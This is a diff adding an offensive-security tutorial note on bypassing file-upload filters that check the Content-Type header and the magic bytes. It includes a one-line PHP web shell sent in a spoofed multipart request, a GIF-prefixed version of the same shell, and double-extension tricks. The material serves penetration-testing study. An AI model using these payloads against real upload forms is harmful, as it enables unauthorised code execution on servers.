@@ -1,0 +1,70 @@
+---
+title: MIME and Content-Type Filters
+---
+
+Modern servers often look past the extension and inspect the file's actual content. You'll see two distinct checks: the **Content-Type header** (sent by the browser) and the **MIME type / magic bytes** (read from the file body). Each has its own bypass.
+
+## The Two Checks
+
+### Content-Type Header Filter
+
+```php
+$type = $_FILES['uploadFile']['type'];
+
+if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
+    echo "Only images are allowed";
+    die();
+}
+```
+
+The server reads the `Content-Type` sub-header of the uploaded file in the multipart request. Problem: that header is set by your browser — which means you set it.
+
+**Bypass:** In Burp, intercept the upload and change the file's Content-Type to an allowed value:
+
+```http
+Content-Disposition: form-data; name="file"; filename="shell.phar"
+Content-Type: image/png
+
+<?php system($_GET['c']); ?>
+```
+
+> [!tip] Two Content-Type headers in one request
+> A multipart upload has one `Content-Type` for the whole HTTP request (usually `multipart/form-data`), and another inside the body for each attached file. You almost always want to modify the file's header, but when the file is sent as raw POST data (no multipart), modify the request's top-level header instead.
+
+### MIME Type / Magic Byte Filter
+
+```php
+$mime = mime_content_type($_FILES['uploadFile']['tmp_name']);
+if (!in_array($mime, array('image/jpeg', 'image/png', 'image/gif'))) { ... }
+```
+
+Here the server reads the first few bytes of the file body to determine the real type — regardless of extension or headers. These are the **magic bytes**:
+
+| Format | Magic Bytes |
+|---|---|
+| GIF | `GIF87a` or `GIF89a` (printable ASCII — easiest to fake) |
+| PNG | `\x89PNG\r\n\x1a\n` (binary) |
+| JPEG | `\xFF\xD8\xFF\xE0` (binary) |
+| PDF | `%PDF-1.4` (printable ASCII) |
+
+**Bypass:** Prepend valid magic bytes to your payload. GIF is the easiest because `GIF8` is ASCII and common to both GIF variants:
+
+```
+GIF87a
+<?php system($_GET['c']); ?>
+```
+
+Save with a PHP-executable extension (`.phar`, `.phtml`). The file passes the magic byte check (looks like a GIF) and still executes (filename triggers the PHP handler).
+
+## Stacking Bypasses
+
+Real applications often layer all three checks. To beat them simultaneously you need:
+
+1. **Valid magic bytes** → passes the MIME check
+2. **Spoofed Content-Type** → passes the header check
+3. **Allowed extension** → passes the extension check (e.g. `shell.jpeg.phar`)
+
+Order matters: `shell.phar.jpeg` may fail where `shell.jpeg.phar` succeeds, depending on which filter runs first and how execution is configured. If one order doesn't work, try the other.
+
+> [!tip] When even that fails
+> If the server is strict about the entire file matching a valid image, place your payload at the *end* of a real image file. Many parsers only inspect the header and will accept a file that starts with real image data and ends with PHP.
